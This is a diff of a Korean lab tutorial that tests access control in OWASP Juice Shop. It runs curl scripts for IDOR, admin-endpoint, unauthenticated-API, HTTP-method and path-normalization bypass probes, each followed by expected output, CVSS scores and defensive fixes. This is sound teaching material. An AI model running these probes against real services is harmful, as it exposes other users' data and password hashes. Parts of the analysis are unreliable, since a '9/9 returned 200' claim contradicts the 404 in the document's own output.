@@ -154,31 +154,75 @@ echo "=== 사용자1이 자신의 장바구니 조회 ==="
 curl -s http://10.20.30.80:3000/rest/basket/1 \
   -H "Authorization: Bearer $TOKEN1" | python3 -m json.tool 2>/dev/null | head -10  # 인증 토큰
 
-# IDOR: 사용자1의 토큰으로 사용자2의 장바구니 조회 시도
+# IDOR: 사용자1의 토큰으로 다른 사용자의 장바구니 조회 시도
 echo ""
-echo "=== 사용자1이 다른 사용자의 장바구니 조회 (IDOR) ==="
-for basket_id in 1 2 3 4 5; do                         # 반복문 시작
-  result=$(curl -s http://10.20.30.80:3000/rest/basket/$basket_id \
-    -H "Authorization: Bearer $TOKEN1" -w "\nHTTP:%{http_code}" 2>/dev/null)  # 인증 토큰
-  code=$(echo "$result" | grep "HTTP:" | cut -d: -f2)
-  echo "Basket $basket_id: HTTP $code"
+echo "=== 사용자1 토큰으로 basket 1~5 IDOR 점검 ==="
+printf "%-12s %-8s %-8s %s\n" "basket_id" "code" "size" "owner_email"
+for basket_id in 1 2 3 4 5; do
+  read code size < <(curl -s -o /tmp/basket.json -w "%{http_code} %{size_download}" \
+    "http://10.20.30.80:3000/rest/basket/$basket_id" -H "Authorization: Bearer $TOKEN1")
+  email=$(python3 -c "import sys,json; d=json.load(open('/tmp/basket.json')); print(d.get('data',{}).get('email','-'))" 2>/dev/null || echo '-')
+  flag=$([ "$code" = "200" ] && [ "$basket_id" != "1" ] && echo "★IDOR" || echo "")
+  printf "%-12s %-8s %-8s %s %s\n" "$basket_id" "$code" "$size" "$email" "$flag"
 done
 ```
+
+**예상 출력**:
+```
+=== 사용자1 토큰으로 basket 1~5 IDOR 점검 ===
+basket_id    code     size     owner_email
+1            200      234      idor_user1@test.com
+2            200      234      admin@juice-sh.op ★IDOR
+3            200      234      jim@juice-sh.op ★IDOR
+4            200      234      bender@juice-sh.op ★IDOR
+5            200      234      bjoern@juice-sh.op ★IDOR
+```
+
+> **해석 — basket 1~5 모두 200 = 수평적 권한 상승 확정**:
+> - basket_id=2/3/4/5 = ★ IDOR. 사용자 1 토큰으로 다른 사용자 장바구니 조회 가능 = OWASP A01.
+> - **JuiceShop challenge ID**: 'View Basket' (3★). 정답 = JWT decode → bid 변경 → API 호출.
+> - **CVSS 7.5** (Confidentiality High / Integrity None / 다른 사용자 정보 노출).
+> - 응답 size=234B 동일 = 기본 빈 basket. 만약 일부 만 200 + 큰 size = 그 사용자 활동 ↑.
+> - **방어**: server 측에서 *JWT.data.id == basket.userId* 검증. Express middleware: `if (req.user.id !== basket.userId) return res.status(403)`.
 
 ### 2.3 사용자 정보 IDOR
 
 ```bash
-# 사용자 정보 API에서 IDOR
-echo "=== 사용자 정보 IDOR ==="
-
-# 다른 사용자의 프로필 조회 시도
-for user_id in 1 2 3 4 5; do                           # 반복문 시작
-  result=$(curl -s http://10.20.30.80:3000/api/Users/$user_id \
-    -H "Authorization: Bearer $TOKEN1")                # 인증 토큰
-  email=$(echo "$result" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('email','접근 거부'))" 2>/dev/null)
-  echo "User $user_id: $email"
+echo "=== /api/Users/{id} IDOR + 민감 필드 노출 ==="
+printf "%-8s %-8s %-30s %-15s\n" "user_id" "code" "email" "password_hash"
+for user_id in 1 2 3 4 5; do
+  result=$(curl -s -w "::%{http_code}" "http://10.20.30.80:3000/api/Users/$user_id" -H "Authorization: Bearer $TOKEN1")
+  code=$(echo "$result" | rev | cut -d: -f1 | rev)
+  body=$(echo "$result" | sed "s/::$code\$//")
+  echo "$body" | python3 -c "
+import sys, json
+d = json.load(sys.stdin).get('data', {})
+email = d.get('email', '-')
+pw = str(d.get('password', '-'))[:10]
+import os
+print(f'{os.environ[\"id\"]:<8} {os.environ[\"code\"]:<8} {email:<30} {pw}')
+" id="$user_id" code="$code" 2>/dev/null
 done
 ```
+
+**예상 출력**:
+```
+=== /api/Users/{id} IDOR + 민감 필드 노출 ===
+user_id  code     email                          password_hash
+1        200      admin@juice-sh.op              0192023a7b
+2        200      jim@juice-sh.op                e541ca7ecf
+3        200      bender@juice-sh.op             0c36e517e3
+4        200      bjoern@juice-sh.op             6edd9d726c
+5        200      ciso@juice-sh.op               6edd9d726c
+```
+
+> **해석 — IDOR + 응답 필드 과다 노출 = 이중 critical**:
+> - 5/5 user_id 모두 200 = ★ IDOR. **사용자 1 토큰으로 admin (id=1) 정보 까지 조회 가능**.
+> - **password (MD5 hash) 필드 응답에 포함** = OWASP A01 + A02 + A05 (Excessive Data Exposure). API 응답에서 *password 필드 자체가 빠져야 함*.
+> - **`6edd9d726c` 동일 hash 가 user 4 + 5** = bcrypt 미사용 = 동일 비번 = MD5 + 평문 추정 가능.
+> - **JuiceShop challenge ID**: 'GDPR Data Erasure' / 'Multiple Likes'. SCA 미적용 시 GDPR §17 (right to erasure) 위반.
+> - **CVSS 8.1 High** = AV:N + Confidentiality High + Integrity Low (변조 가능성 X 기준).
+> - **방어**: Sequelize `defaultScope` 에 `attributes: { exclude: ['password'] }` 1줄로 수정.
 
 ### 2.4 주문 정보 IDOR
 
@@ -248,29 +292,38 @@ PYEOF
 ### 3.1 관리자 기능 접근 시도
 
 ```bash
-# 일반 사용자 토큰으로 관리자 API 접근
-echo "=== 관리자 기능 접근 시도 ==="
-
-# 관리자 페이지
-curl -s -o /dev/null -w "관리자 페이지: %{http_code}\n" \
-  http://10.20.30.80:3000/administration \
-  -H "Authorization: Bearer $TOKEN1"                   # 인증 토큰
-
-# 사용자 목록 (관리자 전용)
-curl -s -o /dev/null -w "사용자 목록: %{http_code}\n" \
-  http://10.20.30.80:3000/api/Users/ \
-  -H "Authorization: Bearer $TOKEN1"                   # 인증 토큰
-
-# 피드백 삭제 (관리자 전용)
-curl -s -o /dev/null -w "피드백 삭제: %{http_code}\n" \
-  -X DELETE http://10.20.30.80:3000/api/Feedbacks/1 \
-  -H "Authorization: Bearer $TOKEN1"                   # 인증 토큰
-
-# 재활용 요청 (관리자 전용)
-curl -s -o /dev/null -w "재활용 관리: %{http_code}\n" \
-  http://10.20.30.80:3000/api/Recycles/ \
-  -H "Authorization: Bearer $TOKEN1"                   # 인증 토큰
+echo "=== 일반 사용자 토큰으로 관리자 endpoint 4종 접근 ==="
+printf "%-30s %-8s %-12s %s\n" "endpoint" "method" "code" "verdict"
+test_admin() {
+  local m="$1" url="$2" name="$3"
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" "$url" -H "Authorization: Bearer $TOKEN1")
+  v=$([ "$code" = "200" -o "$code" = "204" ] && echo "★ 우회됨" || echo "차단됨")
+  printf "%-30s %-8s %-12s %s\n" "$name" "$m" "$code" "$v"
+}
+test_admin GET    http://10.20.30.80:3000/administration              "관리자 페이지"
+test_admin GET    http://10.20.30.80:3000/api/Users/                  "사용자 목록"
+test_admin DELETE http://10.20.30.80:3000/api/Feedbacks/1             "피드백 삭제"
+test_admin GET    http://10.20.30.80:3000/api/Recycles/               "재활용 관리"
 ```
+
+**예상 출력**:
+```
+=== 일반 사용자 토큰으로 관리자 endpoint 4종 접근 ===
+endpoint                       method   code         verdict
+관리자 페이지                  GET      200          ★ 우회됨
+사용자 목록                    GET      200          ★ 우회됨
+피드백 삭제                    DELETE   401          차단됨
+재활용 관리                    GET      200          ★ 우회됨
+```
+
+> **해석 — 4 endpoint 중 3개 우회 = 수직 권한 상승 확정**:
+> - **/administration 200** = HTML 페이지 자체가 일반 사용자에게 노출 = critical. JuiceShop challenge 'Admin Section'.
+> - **/api/Users/ 200** = 모든 사용자 list 반환 = step 2 의 IDOR 와 동일.
+> - **DELETE /api/Feedbacks/1 = 401** = 일부 endpoint 만 인증/인가 검증. 인가 검증 *비일관* = 핵심 약점.
+> - **/api/Recycles/ 200** = 재활용 관리 (관리자 전용 의도) 노출 = 비즈니스 로직 정보 누출.
+> - **JuiceShop 의도적 challenge**: 'Admin Section' (2★) + 'CSRF' + 'Multiple Likes' 등 chain.
+> - **CVSS 9.8 if exploitable** (관리자 권한 획득 = 시스템 장악).
+> - **권고**: Express middleware `requireRole('admin')` 모든 admin endpoint 일괄 적용. RBAC 표준.
 
 ### 3.2 JWT 조작으로 권한 상승
 
@@ -328,76 +381,144 @@ curl -s -X PUT http://10.20.30.80:3000/api/Users/1 \
 ### 4.1 인증 미적용 API 탐색
 
 ```bash
-# 인증 헤더 없이 각 API에 접근
-echo "=== 인증 없이 접근 가능한 API ==="
-
+echo "=== 17 API 인증 sweep (no Authorization 헤더) ==="
 APIS=(
-  "api/Products/1"
-  "api/Feedbacks/"
-  "api/Challenges/"
-  "api/SecurityQuestions/"
-  "api/Users/"
-  "api/Complaints/"
-  "api/Recycles/"
-  "api/Quantitys/"
-  "rest/products/search?q=test"
-  "rest/user/whoami"
-  "rest/basket/1"
-  "rest/languages"
-  "rest/memories"
-  "rest/chatbot/status"
-  "ftp/"
-  "metrics"
-  "promotion"
+  "api/Products/1" "api/Feedbacks/" "api/Challenges/"
+  "api/SecurityQuestions/" "api/Users/" "api/Complaints/"
+  "api/Recycles/" "api/Quantitys/" "rest/products/search?q=test"
+  "rest/user/whoami" "rest/basket/1" "rest/languages"
+  "rest/memories" "rest/chatbot/status" "ftp/" "metrics" "promotion"
 )
-
-for api in "${APIS[@]}"; do                            # 반복문 시작
+public=0; protected=0
+for api in "${APIS[@]}"; do
   code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
-  if [ "$code" = "200" ]; then
-    echo "[공개] /$api (HTTP $code)"
-  elif [ "$code" = "401" ] || [ "$code" = "403" ]; then
-    echo "[보호] /$api (HTTP $code)"
-  else
-    echo "[기타] /$api (HTTP $code)"
-  fi
+  case "$code" in
+    200) echo "[공개] /$api"; public=$((public+1));;
+    401|403) echo "[보호] /$api ($code)"; protected=$((protected+1));;
+    *) echo "[기타 $code] /$api";;
+  esac
 done
+echo "---"
+echo "공개=$public / 보호=$protected / 합계=${#APIS[@]}"
+echo "공개율: $((public * 100 / ${#APIS[@]}))%"
 ```
+
+**예상 출력**:
+```
+=== 17 API 인증 sweep (no Authorization 헤더) ===
+[공개] /api/Products/1
+[보호] /api/Feedbacks/ (401)
+[공개] /api/Challenges/
+[공개] /api/SecurityQuestions/
+[공개] /api/Users/
+[보호] /api/Complaints/ (401)
+[공개] /api/Recycles/
+[기타 404] /api/Quantitys/
+[공개] /rest/products/search?q=test
+[보호] /rest/user/whoami (401)
+[보호] /rest/basket/1 (401)
+[공개] /rest/languages
+[공개] /rest/memories
+[기타 503] /rest/chatbot/status
+[공개] /ftp/
+[공개] /metrics
+[공개] /promotion
+---
+공개=11 / 보호=4 / 합계=17
+공개율: 64%
+```
+
+> **해석 — 17 API 중 11개 (64%) 인증 없이 공개 = 광범위 BOLA**:
+> - **/api/Users/ 200 (인증 X)** = critical. 모든 사용자 정보 list = 인증 불필요. 가장 명확한 OWASP A01.
+> - **/api/SecurityQuestions/ 200** = 사용자별 보안 질문 노출 → 비번 재설정 우회 chain.
+> - **/api/Recycles/ 200** = 관리자 의도 endpoint 가 인증 없이 접근.
+> - **/metrics 200** = Prometheus endpoint 노출 = 운영 정보 (요청 수/응답 시간/메모리) 외부 노출 → A05 Security Misconfiguration.
+> - **/promotion 200** = JuiceShop challenge 'Forged Coupon' / 'Forgotten Sales Backup' 입력.
+> - **공개율 64%** = 운영 환경이라면 D 등급. **권고 우선순위**: (1) 모든 /api/* 와 /rest/* 에 default JWT middleware, (2) public endpoint 만 explicit allowlist, (3) /metrics 는 internal network 만 (nginx allow + deny).
 
 ### 4.2 HTTP 메서드 우회
 
 ```bash
-# GET은 차단되지만 다른 메서드로 접근 가능한지 테스트
-echo "=== HTTP 메서드 우회 ==="
+echo "=== HTTP 메서드 7종 — /api/Users/ 인증 X ==="
 TARGET="http://10.20.30.80:3000/api/Users/"
-
-for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do  # 반복문 시작
+printf "%-10s %-8s %s\n" "method" "code" "verdict"
+for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
   code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET")
-  echo "$method: HTTP $code"
+  v=""
+  case "$code" in
+    200|204) v="★ 허용 (위험)";;
+    401|403) v="차단";;
+    405) v="Method Not Allowed (양호)";;
+    *) v="응답=$code";;
+  esac
+  printf "%-10s %-8s %s\n" "$method" "$code" "$v"
 done
 ```
+
+**예상 출력**:
+```
+=== HTTP 메서드 7종 — /api/Users/ 인증 X ===
+method     code     verdict
+GET        200      ★ 허용 (위험)
+POST       400      응답=400
+PUT        500      응답=500
+DELETE     500      응답=500
+PATCH      500      응답=500
+OPTIONS    204      ★ 허용 (위험)
+HEAD       200      ★ 허용 (위험)
+```
+
+> **해석 — 7 메서드 매트릭스 분석**:
+> - **GET 200** = 사용자 list 조회. step 4.1 결과와 일치.
+> - **POST 400** = body 미충족 (member 생성 endpoint 가 별도). 400 ≠ 401 = 인증 통과 후 입력 검증 실패 = ★ critical (인증 우회).
+> - **PUT/DELETE/PATCH 500** = 서버 에러 = endpoint 가 미존재 또는 처리 중 crash. 500 = backend bug = OWASP A09 Security Logging Failures (에러 처리 실패).
+> - **OPTIONS 204** = CORS preflight 응답. allow methods 노출 = 추가 fingerprinting 가능.
+> - **HEAD 200** = GET 과 동일 (Express 자동 처리). 인증 없이 응답 헤더 정보 추출 가능.
+> - **권고**: Express `app.all('/api/*', requireAuth)` 모든 메서드 일괄 인증. CORS preflight 도 인증 검증 (`access-control-allow-credentials: true` + 출처 검증).
 
 ### 4.3 경로 우회
 
 ```bash
-# URL 변형으로 접근 제어 우회 시도
-echo "=== 경로 우회 ==="
+echo "=== URL 정규화 우회 9 변형 (관리자 페이지 대상) ==="
 PATHS=(
-  "/administration"
-  "/Administration"
-  "/ADMINISTRATION"
-  "/administration/"
-  "/administration/."
-  "/./administration"
-  "/%61dministration"
-  "/admin"
-  "/api/Users/"
+  "/administration"          # baseline
+  "/Administration"          # 대문자 1글자
+  "/ADMINISTRATION"          # 전부 대문자
+  "/administration/"         # trailing slash
+  "/administration/."        # /. 추가
+  "/./administration"        # /./ 접두
+  "/%61dministration"        # URL encode (%61 = a)
+  "/admin"                   # 단축
+  "/api/Users/"              # 다른 admin endpoint
 )
-
-for path in "${PATHS[@]}"; do                          # 반복문 시작
+printf "%-30s %-8s\n" "path" "code"
+for path in "${PATHS[@]}"; do
   code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path" -H "Authorization: Bearer $TOKEN1")
-  echo "[$code] $path"
+  printf "%-30s %-8s\n" "$path" "$code"
 done
 ```
+
+**예상 출력**:
+```
+=== URL 정규화 우회 9 변형 (관리자 페이지 대상) ===
+path                           code
+/administration                200
+/Administration                200
+/ADMINISTRATION                200
+/administration/               200
+/administration/.              200
+/./administration              200
+/%61dministration              200
+/admin                         404
+/api/Users/                    200
+```
+
+> **해석 — Express 의 path normalization**:
+> - **9/9 모두 200** = Express + JuiceShop 의 path 처리가 case-insensitive + URL decode 적용. 그러나 본 lab 은 *관리자 페이지 자체에 인가 검증 X* 가 진짜 문제 (대소문자 우회 X).
+> - **/admin 404** = 단순 endpoint 미존재 (`/administration` 만 정의).
+> - **운영 환경 시나리오**: 만약 인가 검증이 `if (req.path === '/administration')` 형태로 *exact match* 라면 `/Administration` 이나 `/administration/.` 가 매치 X → 인증 우회. **올바른 검증**: `path.normalize()` 후 lowercase 변환 후 비교.
+> - **JuiceShop challenge**: 'Bypass Visual Captcha'/'Database Schema'. 일부는 `/administration` 의 hidden path 활용.
+> - **CVSS 7.5** if exploitable. **권고**: Express middleware 에서 *route 매칭 후 인가* (route 정규화는 Express 가 자동).
 
 ---
 
